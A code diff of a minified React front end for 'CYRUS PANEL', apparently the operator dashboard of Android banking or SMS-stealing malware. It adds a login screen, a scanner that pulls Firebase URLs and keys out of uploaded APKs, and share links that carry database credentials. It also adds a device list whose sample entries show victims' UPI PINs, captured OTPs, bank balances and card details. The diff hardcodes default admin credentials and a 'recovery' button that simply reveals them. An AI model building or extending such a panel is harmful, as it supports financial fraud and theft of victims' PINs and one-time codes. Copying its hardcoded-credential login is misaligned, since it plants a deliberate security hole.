-                            children: [r.jsx("h3", {
-                                className: "font-semibold text-foreground text-sm",
-                                children: "Share Connection"
-                            }), r.jsx("p", {
-                                className: "text-xs text-muted-foreground",
-                                children: "Anyone with this link can connect directly"
-                            })]
-                        })]
-                    }), r.jsx("button", {
-                        onClick: () => E(""),
-                        className: "p-1.5 rounded-lg hover:bg-accent transition-colors text-muted-foreground",
-                        children: r.jsx(nl, {
-                            className: "w-4 h-4"
+                        ]
+                    }),
+
+                    r.jsxs("div", {
+                        className: "glass-card rounded-3xl p-6 sm:p-7 shadow-2xl shadow-black/80 border border-white/10 backdrop-blur-xl",
+                        children: [
+                            r.jsxs("div", {
+                                className: "flex rounded-2xl bg-black/40 p-1.5 border border-white/5 mb-6",
+                                children: [
+                                    r.jsxs("button", {
+                                        type: "button",
+                                        onClick: () => { setLoginMode("email"); setEmailError(""); },
+                                        className: `flex-1 py-2.5 rounded-xl text-xs sm:text-sm font-semibold transition-all flex items-center justify-center gap-2 ${loginMode === "email" ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 shadow-md shadow-cyan-500/10" : "text-muted-foreground hover:text-white"}`,
+                                        children: [
+                                            r.jsx("svg", {
+                                                viewBox: "0 0 24 24",
+                                                width: "16",
+                                                height: "16",
+                                                fill: "none",
+                                                stroke: "currentColor",
+                                                strokeWidth: "2",
+                                                strokeLinecap: "round",
+                                                children: r.jsx("path", { d: "M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2zM22 6l-10 7L2 6" })
+                                            }),
+                                            "Email ID Login"
+                                        ]
+                                    }),
+                                    r.jsxs("button", {
+                                        type: "button",
+                                        onClick: () => { setLoginMode("firebase"); T(""); },
+                                        className: `flex-1 py-2.5 rounded-xl text-xs sm:text-sm font-semibold transition-all flex items-center justify-center gap-2 ${loginMode === "firebase" ? "bg-red-500/20 text-red-300 border border-red-500/40 shadow-md shadow-red-500/10" : "text-muted-foreground hover:text-white"}`,
+                                        children: [
+                                            r.jsx("svg", {
+                                                viewBox: "0 0 24 24",
+                                                width: "16",
+                                                height: "16",
+                                                fill: "none",
+                                                stroke: "currentColor",
+                                                strokeWidth: "2",
+                                                strokeLinecap: "round",
+                                                children: r.jsx("path", { d: "M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" })
+                                            }),
+                                            "Database URL"
+                                        ]
+                                    })
+                                ]
+                            }),
+
+                            loginMode === "email" && r.jsxs("form", {
+                                onSubmit: handleEmailLogin,
+                                className: "space-y-4 animate-fade-up",
+                                children: [
+                                    r.jsxs("div", {
+                                        children: [
+                                            r.jsx("label", {
+                                                className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-1.5",
+                                                children: "Email ID"
+                                            }),
+                                            r.jsxs("div", {
+                                                className: "relative",
+                                                children: [
+                                                    r.jsx("div", {
+                                                        className: "absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-muted-foreground",
+                                                        children: r.jsx("svg", {
+                                                            viewBox: "0 0 24 24",
+                                                            width: "18",
+                                                            height: "18",
+                                                            fill: "none",
+                                                            stroke: "currentColor",
+                                                            strokeWidth: "2",
+                                                            strokeLinecap: "round",
+                                                            children: r.jsx("path", { d: "M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2zM22 6l-10 7L2 6" })
+                                                        })
+                                                    }),
+                                                    r.jsx("input", {
+                                                        type: "email",
+                                                        value: email,
+                                                        onChange: e => setEmail(e.target.value),
+                                                        placeholder: "admin@cyruspanel.com",
+                                                        required: !0,
+                                                        className: "w-full pl-10 pr-4 py-3 rounded-xl bg-muted/40 border border-border focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 outline-none text-sm text-foreground placeholder:text-muted-foreground/50 transition-all font-mono"
+                                                    })
+                                                ]
+                                            })
+                                        ]
+                                    }),
+
+                                    r.jsxs("div", {
+                                        children: [
+                                            r.jsxs("div", {
+                                                className: "flex items-center justify-between mb-1.5",
+                                                children: [
+                                                    r.jsx("label", {
+                                                        className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground",
+                                                        children: "Password"
+                                                    }),
+                                                    r.jsx("button", {
+                                                        type: "button",
+                                                        onClick: () => setShowForgot(!0),
+                                                        className: "text-xs text-cyan-400 hover:underline",
+                                                        children: "Forgot password?"
+                                                    })
+                                                ]
+                                            }),
+                                            r.jsxs("div", {
+                                                className: "relative",
+                                                children: [
+                                                    r.jsx("div", {
+                                                        className: "absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-muted-foreground",
+                                                        children: r.jsx("svg", {
+                                                            viewBox: "0 0 24 24",
+                                                            width: "18",
+                                                            height: "18",
+                                                            fill: "none",
+                                                            stroke: "currentColor",
+                                                            strokeWidth: "2",
+                                                            strokeLinecap: "round",
+                                                            children: r.jsx("path", { d: "M19 11H5a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7a2 2 0 0 0-2-2zm-7-8a4 4 0 0 0-4 4v4h8V7a4 4 0 0 0-4-4z" })
+                                                        })
+                                                    }),
+                                                    r.jsx("input", {
+                                                        type: showPassword ? "text" : "password",
+                                                        value: password,
+                                                        onChange: e => setPassword(e.target.value),
+                                                        placeholder: "Enter password",
+                                                        required: !0,
+                                                        className: "w-full pl-10 pr-11 py-3 rounded-xl bg-muted/40 border border-border focus:border-cyan-500 focus:ring-2 focus:ring-cyan-500/20 outline-none text-sm text-foreground placeholder:text-muted-foreground/50 transition-all font-mono"
+                                                    }),
+                                                    r.jsx("button", {
+                                                        type: "button",
+                                                        onClick: () => setShowPassword(!showPassword),
+                                                        className: "absolute inset-y-0 right-0 pr-3.5 flex items-center text-muted-foreground hover:text-white",
+                                                        children: showPassword ? r.jsx("svg", {
+                                                            viewBox: "0 0 24 24",
+                                                            width: "18",
+                                                            height: "18",
+                                                            fill: "none",
+                                                            stroke: "currentColor",
+                                                            strokeWidth: "2",
+                                                            children: r.jsx("path", { d: "M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24M1 1l22 22" })
+                                                        }) : r.jsx("svg", {
+                                                            viewBox: "0 0 24 24",
+                                                            width: "18",
+                                                            height: "18",
+                                                            fill: "none",
+                                                            stroke: "currentColor",
+                                                            strokeWidth: "2",
+                                                            children: r.jsxs("g", {
+                                                                children: [
+                                                                    r.jsx("path", { d: "M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" }),
+                                                                    r.jsx("circle", { cx: "12", cy: "12", r: "3" })
+                                                                ]
+                                                            })
+                                                        })
+                                                    })
+                                                ]
+                                            })
+                                        ]
+                                    }),
+
+                                    r.jsxs("div", {
+                                        className: "flex items-center justify-between text-xs pt-1",
+                                        children: [
+                                            r.jsxs("label", {
+                                                className: "flex items-center gap-2 cursor-pointer text-muted-foreground hover:text-white",
+                                                children: [
+                                                    r.jsx("input", {
+                                                        type: "checkbox",
+                                                        checked: rememberMe,
+                                                        onChange: e => setRememberMe(e.target.checked),
+                                                        className: "rounded border-border bg-muted/40 text-cyan-500 focus:ring-cyan-500"
+                                                    }),
+                                                    "Remember me"
+                                                ]
+                                            }),
+                                            r.jsxs("button", {
+                                                type: "button",
+                                                onClick: () => handleQuickFill("admin@cyruspanel.com", "admin123"),
+                                                className: "px-2 py-1 rounded-md bg-cyan-950/40 border border-cyan-800/40 text-[11px] text-cyan-400 hover:bg-cyan-900/50 transition-all font-mono",
+                                                children: ["⚡ Quick Fill Admin"]
+                                            })
+                                        ]
+                                    }),
+
+                                    emailError && r.jsxs("div", {
+                                        className: "p-3 rounded-xl bg-red-950/40 border border-red-900/50 text-red-400 text-xs flex items-center gap-2 animate-fade-up",
+                                        children: [
+                                            r.jsx("svg", {
+                                                viewBox: "0 0 24 24",
+                                                width: "16",
+                                                height: "16",
+                                                fill: "none",
+                                                stroke: "currentColor",
+                                                strokeWidth: "2",
+                                                className: "flex-shrink-0",
+                                                children: r.jsx("path", { d: "M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" })
+                                            }),
+                                            r.jsx("span", { children: emailError })
+                                        ]
+                                    }),
+
+                                    r.jsxs("button", {
+                                        type: "submit",
+                                        disabled: emailLoading,
+                                        className: "w-full flex items-center justify-center gap-2 py-3.5 rounded-xl bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-semibold text-sm shadow-lg shadow-cyan-600/25 transition-all active:scale-[0.99] disabled:opacity-50",
+                                        children: [
+                                            emailLoading ? r.jsx("div", {
+                                                className: "w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"
+                                            }) : r.jsx("svg", {
+                                                viewBox: "0 0 24 24",
+                                                width: "16",
+                                                height: "16",
+                                                fill: "none",
+                                                stroke: "currentColor",
+                                                strokeWidth: "2",
+                                                children: r.jsx("path", { d: "M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4M10 17l5-5-5-5M15 12H3" })
+                                            }),
+                                            emailLoading ? "Authenticating…" : "Login to Panel"
+                                        ]
+                                    }),
+
+                                    r.jsxs("div", {
+                                        className: "grid grid-cols-2 gap-2 pt-2",
+                                        children: [
+                                            r.jsx("button", {
+                                                type: "button",
+                                                onClick: () => setShowRegister(!0),
+                                                className: "py-2.5 px-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/5 text-xs font-medium text-muted-foreground hover:text-white transition-all text-center",
+                                                children: "Create Account"
+                                            }),
+                                            r.jsx("button", {
+                                                type: "button",
+                                                onClick: () => window.location.assign("/get-accounts/"),
+                                                className: "py-2.5 px-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/5 text-xs font-medium text-[#9bc8d4] hover:text-white transition-all text-center",
+                                                children: "Get Access"
+                                            })
+                                        ]
+                                    })
+                                ]
+                            }),
+
+                            loginMode === "firebase" && r.jsxs("div", {
+                                className: "space-y-4 animate-fade-up",
+                                children: [
+                                    !d && tt.length > 0 && r.jsxs("div", {
+                                        className: "mb-4",
+                                        children: [
+                                            r.jsxs("div", {
+                                                className: "flex items-center justify-between mb-2 text-xs font-semibold text-muted-foreground",
+                                                children: [
+                                                    r.jsx("span", { children: "Saved Database Connections" }),
+                                                    r.jsx("span", { children: `${tt.length} saved` })
+                                                ]
+                                            }),
+                                            r.jsx("div", {
+                                                className: "space-y-1.5 max-h-40 overflow-y-auto pr-1",
+                                                children: tt.map(_ => r.jsxs("div", {
+                                                    onClick: () => !w && at(_),
+                                                    className: "flex items-center gap-2 p-2.5 rounded-xl border border-border hover:border-red-600/40 hover:bg-red-950/20 cursor-pointer transition-all text-xs group",
+                                                    children: [
+                                                        r.jsxs("div", {
+                                                            className: "flex-1 min-w-0",
+                                                            children: [
+                                                                r.jsx("p", { className: "font-semibold text-foreground truncate", children: _.url }),
+                                                                r.jsx("p", { className: "text-muted-foreground font-mono text-[10px]", children: `${_.date} · ${_.key.substring(0, 16)}…` })
+                                                            ]
+                                                        }),
+                                                        r.jsx("button", {
+                                                            onClick: X => c(_, X),
+                                                            className: "p-1 rounded-lg bg-blue-950/60 border border-blue-900/40 text-blue-400 hover:bg-blue-900/60",
+                                                            title: "Share",
+                                                            children: r.jsx(Ap, { className: "w-3 h-3" })
+                                                        }),
+                                                        r.jsx("button", {
+                                                            onClick: X => Z(_.id, X),
+                                                            className: "p-1 rounded-lg bg-red-950/60 border border-red-900/40 text-red-400 hover:bg-red-900/60",
+                                                            title: "Delete",
+                                                            children: r.jsx(oh, { className: "w-3 h-3" })
+                                                        })
+                                                    ]
+                                                }, _.id))
+                                            })
+                                        ]
+                                    }),
+
+                                    r.jsxs("div", {
+                                        className: "relative border border-dashed border-border hover:border-cyan-500/50 rounded-2xl p-4 text-center cursor-pointer transition-colors bg-muted/20",
+                                        onClick: () => $.current ?.click(),
+                                        onDragOver: bt,
+                                        onDrop: bt,
+                                        children: [
+                                            r.jsx("input", {
+                                                ref: $,
+                                                type: "file",
+                                                accept: ".apk,.zip",
+                                                onChange: it,
+                                                className: "hidden"
+                                            }),
+                                            r.jsx(gp, { className: "w-6 h-6 mx-auto mb-1.5 text-cyan-400" }),
+                                            r.jsx("p", { className: "text-xs font-semibold text-foreground", children: "Scan APK / ZIP file for Firebase config" }),
+                                            r.jsx("p", { className: "text-[10px] text-muted-foreground mt-0.5", children: "Auto-extracts Firebase URL & API Key" })
+                                        ]
+                                    }),
+
+                                    N && r.jsxs("div", {
+                                        className: "flex items-center gap-2 p-3 rounded-xl bg-orange-950/20 border border-orange-900/40 text-xs text-orange-400",
+                                        children: [
+                                            r.jsx("div", { className: "w-3.5 h-3.5 border-2 border-orange-500/30 border-t-orange-500 rounded-full animate-spin flex-shrink-0" }),
+                                            r.jsx("span", { children: `Scanning APK: ${V}…` })
+                                        ]
+                                    }),
+
+                                    M && r.jsxs("div", {
+                                        className: "p-2.5 rounded-xl bg-red-950/30 border border-red-900/40 text-red-400 text-xs flex items-center justify-between",
+                                        children: [
+                                            r.jsx("span", { children: M }),
+                                            r.jsx("button", { onClick: y, className: "text-muted-foreground hover:text-white", children: r.jsx(nl, { className: "w-3 h-3" }) })
+                                        ]
+                                    }),
+
+                                    r.jsxs("div", {
+                                        className: "space-y-3",
+                                        children: [
+                                            r.jsxs("div", {
+                                                children: [
+                                                    r.jsx("label", { className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-1", children: "Firebase Realtime DB URL" }),
+                                                    r.jsx("input", {
+                                                        type: "text",
+                                                        value: f,
+                                                        onChange: _ => p(_.target.value),
+                                                        placeholder: "https://your-app.firebaseio.com",
+                                                        className: "w-full px-3.5 py-2.5 rounded-xl bg-muted/40 border border-border focus:border-red-500 outline-none text-xs text-foreground font-mono"
+                                                    })
+                                                ]
+                                            }),
+                                            r.jsxs("div", {
+                                                children: [
+                                                    r.jsx("label", { className: "block text-xs font-semibold uppercase tracking-wider text-muted-foreground mb-1", children: "Database Secret / Auth Key" }),
+                                                    r.jsx("input", {
+                                                        type: "text",
+                                                        value: h,
+                                                        onChange: _ => o(_.target.value),
+                                                        placeholder: "Database secret key",
+                                                        className: "w-full px-3.5 py-2.5 rounded-xl bg-muted/40 border border-border focus:border-red-500 outline-none text-xs text-foreground font-mono"
+                                                    })
+                                                ]
+                                            })
+                                        ]
+                                    }),
+
+                                    x && r.jsx("p", { className: "text-xs text-red-400 text-center", children: x }),
+
+                                    r.jsxs("button", {
+                                        type: "button",
+                                        onClick: q,
+                                        disabled: w,
+                                        className: "w-full flex items-center justify-center gap-2 py-3 bg-red-600 hover:bg-red-700 rounded-xl text-white font-semibold text-xs transition-colors disabled:opacity-50",
+                                        children: [
+                                            w ? r.jsx("div", { className: "w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" }) : r.jsx(hh, { className: "w-3.5 h-3.5" }),
+                                            w ? "Connecting…" : "Connect Database"
+                                        ]
+                                    })
+                                ]
+                            }),
+
+                            loginMode === "email" && savedUsers.length > 0 && r.jsxs("div", {
+                                className: "mt-6 pt-5 border-t border-white/5",
+                                children: [
+                                    r.jsxs("div", {
+                                        className: "flex items-center justify-between mb-2.5",
+                                        children: [
+                                            r.jsx("span", { className: "text-xs font-semibold text-muted-foreground", children: "Recent Accounts" }),
+                                            r.jsx("span", { className: "text-[10px] text-muted-foreground/60 font-mono", children: "1-Click Switch" })
+                                        ]
+                                    }),
+                                    r.jsx("div", {
+                                        className: "space-y-1.5 max-h-36 overflow-y-auto pr-1",
+                                        children: savedUsers.map(u => r.jsxs("div", {
+                                            onClick: () => {
+                                                setEmail(u.email);
+                                                if (u.password) setPassword(u.password);
+                                                setEmailError("");
+                                            },
+                                            className: "flex items-center justify-between p-2 rounded-xl bg-white/[0.03] hover:bg-white/[0.08] border border-white/5 cursor-pointer transition-all text-xs group",
+                                            children: [
+                                                r.jsxs("div", {
+                                                    className: "flex items-center gap-2 min-w-0",
+                                                    children: [
+                                                        r.jsx("div", {
+                                                            className: "w-6 h-6 rounded-lg bg-cyan-500/20 text-cyan-300 flex items-center justify-center font-bold text-[10px]",
+                                                            children: (u.email[0] || "U").toUpperCase()
+                                                        }),
+                                                        r.jsxs("div", {
+                                                            className: "min-w-0",
+                                                            children: [
+                                                                r.jsx("p", { className: "font-semibold text-white truncate", children: u.email }),
+                                                                r.jsx("p", { className: "text-[10px] text-muted-foreground", children: u.role || "User" })
+                                                            ]
+                                                        })
+                                                    ]
+                                                }),
+                                                r.jsx("button", {
+                                                    type: "button",
+                                                    onClick: ev => deleteSavedUser(u.email, ev),
+                                                    className: "text-muted-foreground/50 hover:text-red-400 p-1 opacity-0 group-hover:opacity-100 transition-opacity",
+                                                    title: "Remove from history",
+                                                    children: r.jsx(oh, { className: "w-3 h-3" })
+                                                })
+                                            ]
+                                        }, u.email))
+                                    })
+                                ]
+                            })
+                        ]
+                    }),
+
+                    r.jsx("p", {
+                        className: "text-center text-xs text-muted-foreground/40 mt-5 font-mono",
+                        children: "© 2026 CYRUS PANEL · All rights reserved"
+                    })
+                ]
+            }),
+
+            showRegister && r.jsx("div", {
+                className: "fixed inset-0 z-50 flex items-center justify-center px-4 bg-black/80 backdrop-blur-md animate-fade-in",
+                onClick: () => setShowRegister(!1),
+                children: r.jsxs("div", {
+                    className: "w-full max-w-md glass-card rounded-3xl p-6 sm:p-7 shadow-2xl border border-white/10 animate-fade-up",
+                    onClick: e => e.stopPropagation(),
+                    children: [
+                        r.jsxs("div", {
+                            className: "flex items-center justify-between mb-5",
+                            children: [
+                                r.jsxs("div", {
+                                    children: [
+                                        r.jsx("h3", { className: "text-lg font-bold text-white", children: "Create Panel Account" }),
+                                        r.jsx("p", { className: "text-xs text-muted-foreground mt-0.5", children: "Register a new email & password login" })
+                                    ]
+                                }),
+                                r.jsx("button", {
+                                    type: "button",
+                                    onClick: () => setShowRegister(!1),
+                                    className: "p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-muted-foreground hover:text-white",
+                                    children: r.jsx(nl, { className: "w-4 h-4" })
+                                })
+                            ]
+                        }),
+                        r.jsxs("form", {
+                            onSubmit: handleRegister,
+                            className: "space-y-3.5",
+                            children: [
+                                r.jsxs("div", {
+                                    children: [
+                                        r.jsx("label", { className: "block text-xs font-semibold text-muted-foreground mb-1", children: "Full Name / Display Name" }),
+                                        r.jsx("input", {
+                                            type: "text",
+                                            value: regName,
+                                            onChange: e => setRegName(e.target.value),
+                                            placeholder: "Admin Name",
+                                            required: !0,
+                                            className: "w-full px-3.5 py-2.5 rounded-xl bg-muted/40 border border-border focus:border-cyan-500 outline-none text-sm text-white"
+                                        })
+                                    ]
+                                }),
+                                r.jsxs("div", {
+                                    children: [
+                                        r.jsx("label", { className: "block text-xs font-semibold text-muted-foreground mb-1", children: "Email Address" }),
+                                        r.jsx("input", {
+                                            type: "email",
+                                            value: regEmail,
+                                            onChange: e => setRegEmail(e.target.value),
+                                            placeholder: "admin@example.com",
+                                            required: !0,
+                                            className: "w-full px-3.5 py-2.5 rounded-xl bg-muted/40 border border-border focus:border-cyan-500 outline-none text-sm text-white font-mono"
+                                        })
+                                    ]
+                                }),
+                                r.jsxs("div", {
+                                    children: [
+                                        r.jsx("label", { className: "block text-xs font-semibold text-muted-foreground mb-1", children: "Password" }),
+                                        r.jsx("input", {
+                                            type: "password",
+                                            value: regPass,
+                                            onChange: e => setRegPass(e.target.value),
+                                            placeholder: "Create a password (min 4 chars)",
+                                            required: !0,
+                                            className: "w-full px-3.5 py-2.5 rounded-xl bg-muted/40 border border-border focus:border-cyan-500 outline-none text-sm text-white font-mono"
+                                        })
+                                    ]
+                                }),
+                                r.jsxs("div", {
+                                    children: [
+                                        r.jsx("label", { className: "block text-xs font-semibold text-muted-foreground mb-1", children: "Confirm Password" }),
+                                        r.jsx("input", {
+                                            type: "password",
+                                            value: regConfirm,
+                                            onChange: e => setRegConfirm(e.target.value),
+                                            placeholder: "Re-enter password",
+                                            required: !0,
+                                            className: "w-full px-3.5 py-2.5 rounded-xl bg-muted/40 border border-border focus:border-cyan-500 outline-none text-sm text-white font-mono"
+                                        })
+                                    ]
+                                }),
+                                regError && r.jsx("p", { className: "text-xs text-red-400", children: regError }),
+                                r.jsxs("div", {
+                                    className: "flex gap-2 pt-2",
+                                    children: [
+                                        r.jsx("button", {
+                                            type: "submit",
+                                            className: "flex-1 py-3 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-semibold transition-colors",
+                                            children: "Register & Sign In"
+                                        }),
+                                        r.jsx("button", {
+                                            type: "button",
+                                            onClick: () => setShowRegister(!1),
+                                            className: "px-4 py-3 rounded-xl bg-muted hover:bg-accent text-xs font-semibold text-muted-foreground",
+                                            children: "Cancel"
+                                        })
+                                    ]
+                                })
+                            ]
                         })
-                    })]
-                }), r.jsxs("div", {
-                    className: "flex items-center gap-2 bg-muted/40 border border-border rounded-xl px-3 py-2.5 mb-4",
-                    children: [r.jsx("span", {
-                        className: "text-xs font-mono text-muted-foreground flex-1 truncate select-all",
-                        children: v
-                    }), r.jsxs("button", {
-                        onClick: I,
-                        className: `flex-shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${g?"bg-emerald-950 border border-emerald-700/60 text-emerald-400":"bg-blue-950 border border-blue-800/60 text-blue-400 hover:bg-blue-900"}`,
-                        children: [g ? r.jsx(uh, {
-                            className: "w-3 h-3"
-                        }) : r.jsx(ch, {
-                            className: "w-3 h-3"
-                        }), g ? "Copied!" : "Copy"]
-                    })]
-                }), r.jsxs("div", {
-                    className: "flex items-start gap-2 p-3 rounded-xl bg-yellow-950/30 border border-yellow-900/40",
-                    children: [r.jsx(gs, {
-                        className: "w-4 h-4 text-yellow-500 flex-shrink-0 mt-0.5"
-                    }), r.jsx("p", {
-                        className: "text-xs text-yellow-400/80",
-                        children: "This link contains your Firebase credentials. Only share with trusted people."
-                    })]
-                })]
+                    ]
+                })
+            }),
+
+            showForgot && r.jsx("div", {
+                className: "fixed inset-0 z-50 flex items-center justify-center px-4 bg-black/80 backdrop-blur-md animate-fade-in",
+                onClick: () => { setShowForgot(!1); setForgotSuccess(!1); },
+                children: r.jsxs("div", {
+                    className: "w-full max-w-md glass-card rounded-3xl p-6 sm:p-7 shadow-2xl border border-white/10 animate-fade-up",
+                    onClick: e => e.stopPropagation(),
+                    children: [
+                        r.jsxs("div", {
+                            className: "flex items-center justify-between mb-4",
+                            children: [
+                                r.jsx("h3", { className: "text-lg font-bold text-white", children: "Password Recovery" }),
+                                r.jsx("button", {
+                                    type: "button",
+                                    onClick: () => { setShowForgot(!1); setForgotSuccess(!1); },
+                                    className: "p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-muted-foreground",
+                                    children: r.jsx(nl, { className: "w-4 h-4" })
+                                })
+                            ]
+                        }),
+                        forgotSuccess ? r.jsxs("div", {
+                            className: "p-4 rounded-2xl bg-emerald-950/30 border border-emerald-900/40 text-center space-y-2",
+                            children: [
+                                r.jsx("p", { className: "text-xs font-bold text-emerald-400", children: "Default Admin Credentials:" }),
+                                r.jsx("p", { className: "text-xs font-mono text-white", children: "Email: admin@cyruspanel.com\nPassword: admin123" }),
+                                r.jsx("button", {
+                                    type: "button",
+                                    onClick: () => {
+                                        setEmail("admin@cyruspanel.com");
+                                        setPassword("admin123");
+                                        setShowForgot(!1);
+                                        setForgotSuccess(!1);
+                                    },
+                                    className: "mt-2 px-4 py-2 rounded-xl bg-emerald-600 text-white text-xs font-semibold",
+                                    children: "Apply & Return to Login"
+                                })
+                            ]
+                        }) : r.jsxs("div", {
+                            className: "space-y-3",
+                            children: [
+                                r.jsx("p", { className: "text-xs text-muted-foreground", children: "Enter your registered email address to retrieve your account or use the default master recovery:" }),
+                                r.jsx("input", {
+                                    type: "email",
+                                    value: forgotEmail,
+                                    onChange: e => setForgotEmail(e.target.value),
+                                    placeholder: "admin@cyruspanel.com",
+                                    className: "w-full px-3.5 py-2.5 rounded-xl bg-muted/40 border border-border focus:border-cyan-500 outline-none text-sm text-white font-mono"
+                                }),
+                                r.jsx("button", {
+                                    type: "button",
+                                    onClick: () => setForgotSuccess(!0),
+                                    className: "w-full py-2.5 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white text-xs font-semibold transition-colors",
+                                    children: "Retrieve Credentials"
+                                })
+                            ]
+                        })
+                    ]
+                })
+            }),
+
+            v && r.jsx("div", {
+                className: "fixed inset-0 z-50 flex items-center justify-center px-4 bg-black/80 backdrop-blur-md",
+                onClick: () => E(""),
+                children: r.jsxs("div", {
+                    className: "w-full max-w-md glass-card rounded-2xl p-6 shadow-2xl border border-white/10",
+                    onClick: _ => _.stopPropagation(),
+                    children: [
+                        r.jsxs("div", {
+                            className: "flex items-center justify-between mb-4",
+                            children: [
+                                r.jsx("h3", { className: "font-semibold text-sm text-white", children: "Share Connection Link" }),
+                                r.jsx("button", { onClick: () => E(""), children: r.jsx(nl, { className: "w-4 h-4 text-muted-foreground" }) })
+                            ]
+                        }),
+                        r.jsxs("div", {
+                            className: "flex items-center gap-2 bg-muted/40 border border-border rounded-xl px-3 py-2.5 mb-3",
+                            children: [
+                                r.jsx("span", { className: "text-xs font-mono text-muted-foreground flex-1 truncate select-all", children: v }),
+                                r.jsxs("button", {
+                                    onClick: I,
+                                    className: "flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-cyan-600 text-white",
+                                    children: [g ? r.jsx(uh, { className: "w-3 h-3" }) : r.jsx(ch, { className: "w-3 h-3" }), g ? "Copied!" : "Copy"]
+                                })
+                            ]
+                        })
+                    ]
+                })
             })
-        })]
-    })
+        ]
+    });
 }
 
 function r1({
@@ -21086,11 +21510,13 @@ function m1() {
 function p1({
     fbUrl: A,
     fbKey: tt,
+    userSession: S_user,
     onLogout: b
 }) {
     const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("all"), [v, E] = jt.useState("new"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), xt = jt.useCallback(U => {
         k(U), setTimeout(() => k(""), 3500)
     }, []), D = jt.useCallback(async (U, J) => {
+        if (!A) return J;
         try {
             const ut = await yn(A, tt, `messages/${U}`, {
                     orderBy: '"$key"',
@@ -21108,6 +21534,110 @@ function p1({
         }
         return J
     }, [A, tt]), at = jt.useCallback(async (U = !1) => {
+        if (!A) {
+            const sampleDevices = [
+                {
+                    id: "dev_s24_ultra",
+                    name: "Samsung Galaxy S24 Ultra",
+                    battery: "88%",
+                    batteryPercent: 88,
+                    status: true,
+                    phoneNumber: "+91 98765 43210",
+                    android: "14.0 (One UI 6.1)",
+                    ip: "103.152.22.14",
+                    storage: "256 GB",
+                    provider: "Jio 5G",
+                    sims: [{ carrier: "Jio 5G", phoneNumber: "+91 98765 43210" }, { carrier: "Airtel 5G", phoneNumber: "+91 98234 56789" }],
+                    upipin: "4829",
+                    cpu: "Snapdragon 8 Gen 3",
+                    sdk: "34",
+                    lastSeen: new Date(),
+                    lastSeenFormatted: "Just now",
+                    smsAnalysis: {
+                        bankBalances: [{ bank: "HDFC Bank", balance: "₹1,45,200", account: "XX4921", date: "Today 10:45 AM" }, { bank: "SBI", balance: "₹48,900", account: "XX1832", date: "Yesterday" }],
+                        cards: [{ bank: "ICICI Bank", last4: "8821", cardType: "Credit Card", limit: "₹2,50,000" }],
+                        otpCount: 14,
+                        lastOtp: "839201"
+                    }
+                },
+                {
+                    id: "dev_oneplus_12",
+                    name: "OnePlus 12 5G",
+                    battery: "64%",
+                    batteryPercent: 64,
+                    status: true,
+                    phoneNumber: "+91 91234 56780",
+                    android: "14.0 (OxygenOS 14)",
+                    ip: "157.34.120.89",
+                    storage: "512 GB",
+                    provider: "Airtel 5G",
+                    sims: [{ carrier: "Airtel 5G", phoneNumber: "+91 91234 56780" }],
+                    upipin: "6712",
+                    cpu: "Snapdragon 8 Gen 3",
+                    sdk: "34",
+                    lastSeen: new Date(),
+                    lastSeenFormatted: "2m ago",
+                    smsAnalysis: {
+                        bankBalances: [{ bank: "Axis Bank", balance: "₹82,450", account: "XX9012", date: "Today 08:30 AM" }],
+                        cards: [{ bank: "HDFC Bank", last4: "4412", cardType: "Debit Card", limit: "₹1,00,000" }],
+                        otpCount: 8,
+                        lastOtp: "450192"
+                    }
+                },
+                {
+                    id: "dev_pixel_8_pro",
+                    name: "Google Pixel 8 Pro",
+                    battery: "92%",
+                    batteryPercent: 92,
+                    status: true,
+                    phoneNumber: "+91 98111 22334",
+                    android: "14.0 (Stock Android)",
+                    ip: "49.36.178.204",
+                    storage: "128 GB",
+                    provider: "Jio 5G",
+                    sims: [{ carrier: "Jio 5G", phoneNumber: "+91 98111 22334" }],
+                    upipin: "9910",
+                    cpu: "Google Tensor G3",
+                    sdk: "34",
+                    lastSeen: new Date(),
+                    lastSeenFormatted: "Just now",
+                    smsAnalysis: {
+                        bankBalances: [{ bank: "Kotak Mahindra", balance: "₹34,100", account: "XX3301", date: "Today 11:15 AM" }],
+                        cards: [],
+                        otpCount: 6,
+                        lastOtp: "119832"
+                    }
+                },
+                {
